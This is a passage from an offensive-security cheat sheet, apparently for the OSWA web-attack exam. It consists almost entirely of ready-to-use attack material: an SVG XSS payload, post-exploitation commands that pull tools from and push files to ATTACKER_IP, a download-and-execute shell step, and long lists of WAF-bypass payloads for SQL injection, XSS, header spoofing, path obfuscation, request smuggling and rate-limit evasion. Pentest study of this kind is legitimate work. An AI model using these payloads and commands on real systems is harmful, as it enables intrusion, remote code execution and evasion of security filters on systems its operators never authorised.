<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```


---

### Post-Exploitation

```bash
# Quick wins
id                    # Who am I?
uname -a              # OS version
sudo -l               # Sudo privileges
find / -name "flag*" 2>/dev/null  # Flags
find / -perm -4000 2>/dev/null    # SUID binaries

# File transfer (attacker serves, target pulls)
python3 -m http.server 8000
curl http://ATTACKER_IP:8000/tool -o /tmp/tool
wget http://ATTACKER_IP:8000/tool -O /tmp/tool

# Netcat file xfer
nc -nvlp 4444 > received_file        # Attacker
nc ATTACKER_IP 4444 < file_to_send    # Target
```

---

### Shell Download & Execute (for SSTI / cmd inj)

```bash
# Host shell.sh on your server, then on target:
curl http://ATTACKER_IP/shell.sh -o /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh
```

---

### WAF Bypass

> OSWA exam machines may include WAF challenges. These techniques have been
> cross-referenced with current PortSwigger Academy and OWASP WAF bypass research.

#### SQLi WAF Bypass

**Whitespace Alternatives**
```sql
/**/                    -- block comment (most reliable)
%09 %0A %0B %0C %0D    -- tab, newline, vertical tab, form feed, carriage return
%a0                     -- non-breaking space (bypasses space-stripping filters)
+                       -- URL-encoded space (sometimes parsed differently)
``                      -- MySQL backtick pairs (in specific positions)
```

**Comment Obfuscation**
```sql
'/**/OR/**/1=1--       -- inline comments between keywords
'/*!50000OR*/1=1--      -- MySQL versioned comment (executes on MySQL >= 5.0)
UN/**/ION/**/SE/**/LECT -- broken UNION SELECT
```

**Keyword Obfuscation**
```sql
UNION SELECT → UNiOn SeLeCt          -- case variation
UNION SELECT → UNI%4FN SEL%45CT      -- URL-encoded characters
UNION SELECT → %55NION %53ELECT      -- full URL encoding
SELSELECTECT                          -- keyword nesting (filter strips one occurrence)
```

**Character Encoding Tricks**
```sql
' OR 1=1-- → %27%20OR%201%3D1--      -- full URL encoding
' OR 1=1-- → ' OR 1%3d1--            -- partial encoding (only = sign)
' OR 1=1-- → CHAR(39)+CHAR(32)+...   -- CHAR() function (MSSQL)
' OR 1=1-- → CONCAT(CHAR(39),...)    -- MySQL equivalent
```

**HTTP Parameter Pollution (HPP)**
```
GET /search?q=test&q=' OR 1=1--      -- duplicate parameter (WAF checks first, app uses second)
POST: q=test%26q=%27+OR+1%3D1--      -- URL-encoded & to inject second parameter
```

**SQLi with JSON**
```json
{"q": "test' OR 1=1--"}              -- WAF may not scan JSON bodies
{"q": {"$gt": ""}}                    -- NoSQL injection pattern (MongoDB)
```

**Buffer Overflow / Long Input**
```sql
AAAAAAAA...[5000+ A's]...' OR 1=1--  -- Overflow WAF buffer, payload passes through
```

#### XSS WAF Bypass

**Tag Obfuscation**
```html
<script> → <scr<script>ipt>          -- nested tag (filter strips inner, outer survives)
<script> → <ScRiPt>                  -- case variation
<script> → <scRipT%20src=...>       -- mixed case with attribute
<script> → %3Cscript%3E              -- HTML entity in some context
```

**Event Handler Variants (bypass alert() filters)**
```html
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=print()>
<svg onload=eval(atob('YWxlcnQoMSk='))>       -- base64-encoded alert(1)
<svg onload=top["al"+"ert"](1)>                -- string concatenation
<svg onload=self["alert"](1)>                  -- alternate reference
<svg/onload=setTimeout('ale'+'rt(1)')>        -- setTimeout with concat
```

**Attribute Context Bypass**
```html
"onmouseover="alert(1)                -- unquoted attribute injection
' onfocus=alert(1) autofocus '        -- single-quoted attribute breakout
` autofocus onfocus=alert(1) `        -- backtick attribute breakout (HTML5)
<%0d%0a autofocus onfocus=alert(1)   -- CRLF injection to break attribute
```

**Protocol Bypass**
```html
javascript:alert(1)                   -- blocked? try:
java%09script:alert(1)                -- tab inside protocol
javaSCRIPT:alert(1)                   -- mixed case
&#106;avascript:alert(1)             -- HTML entity for 'j'
data:text/html,<script>alert(1)</script>  -- data: URI
```

#### Generic WAF Bypass

**HTTP Method Switching**
```http
GET /admin → blocked
POST /admin → may bypass (WAF rules often method-specific)
PUT /admin → try all methods
OPTIONS / → returns allowed methods
```

**Content-Type Mismatch**
```http
POST /api/data HTTP/1.1
Content-Type: application/xml          -- WAF expects JSON, skips XML body

<root><q>' OR 1=1--</q></root>        -- SQLi in XML (WAF not scanning)
```

**Header Manipulation**
```http
X-Forwarded-For: 127.0.0.1           -- appear as localhost
X-Real-IP: 10.0.0.1                  -- internal IP
X-Originating-IP: 127.0.0.1           -- another variant
X-Forwarded-Host: localhost            -- host header bypass
```

**Path Obfuscation**
```
/admin → /%61dmin                     -- URL-encoded 'a'
/admin → /Admin                       -- case variation
/admin → /admin/                       -- trailing slash
/admin → /admin;.js                    -- path parameter
/admin → /admin%00                     -- null byte
/admin → //admin                       -- double slash
/admin → /./admin                      -- dot segment
```

**HTTP Version / Request Smuggling**
```http
GET / HTTP/1.1
Host: target
Transfer-Encoding: chunked            -- CL.TE smuggling

0

GET /admin HTTP/1.1                   -- smuggled request
Host: localhost
```

**Rate Limit Bypass**
```bash
# Rotate User-Agent
curl -H "User-Agent: $(shuf -n 1 user-agents.txt)" https://target

# Add delay jitter
sleep $(awk 'BEGIN{srand(); print rand()*2}')  # random 0-2s delay

# Use alt endpoints
/api/v1 → /api/v2  /api/v1/ → /API/v1/  /api/v1%00
```

**Encoding Stacking**
```
Payload → URL encode → base64 → URL encode again
Some WAFs decode once, application decodes twice
```

---

### URL Encoding Quick Reference

```
space → + or %20    & → %26    # → %23    / → %2F
\ → %5C    " → %22    ' → %27    ; → %3B
| → %7C    \n → %0A    \r → %0D
```
